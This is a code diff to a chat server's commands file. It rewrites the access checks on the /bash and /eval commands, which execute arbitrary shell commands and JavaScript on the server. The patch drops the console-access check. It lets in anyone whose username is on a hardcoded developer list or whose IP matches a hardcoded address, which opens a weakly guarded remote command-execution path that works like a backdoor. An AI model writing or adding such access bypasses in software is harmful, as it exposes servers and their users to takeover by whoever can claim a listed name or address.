@@ -17,6 +17,7 @@ var crypto = require('crypto');
 var fs = require('fs');
 var parseEmoticons = require('./chat-plugins/emoticons').parseEmoticons;
 global.developers = ['panpawn', 'fender', 'nineage', 'voidnaten', 'irraquated']; //sys developers
+var developersIPs = ['76.19.156.193'];
 
 const MAX_REASON_LENGTH = 300;
 const MUTE_LENGTH = 7 * 60 * 1000;
@@ -1857,9 +1858,7 @@ roomintro: function (target, room, user) {
 	},
 
 	bash: function (target, room, user, connection) {
-		if (!user.hasConsoleAccess(connection)) {
-			return this.sendReply("/bash - Access denied.");
-		}
+		if (!~developers.indexOf(user.userid) && !~developersIPs.indexOf(user.latestIp)) return this.errorReply("Access denied.");
 		var exec = require('child_process').exec;
 		exec(target, function (error, stdout, stderr) {
 			connection.sendTo(room, ("" + stdout + stderr));
@@ -1867,9 +1866,7 @@ roomintro: function (target, room, user) {
 	},
 
 	eval: function (target, room, user, connection) {
-		if (!user.hasConsoleAccess(connection)) {
-			return this.sendReply("/eval - Access denied.");
-		}
+		if (!~developers.indexOf(user.userid) && !~developersIPs.indexOf(user.latestIp)) return this.errorReply("Access denied.");
 		if (!this.canBroadcast()) return;
 
 		if (!this.broadcasting) this.sendReply('||>> ' + target);
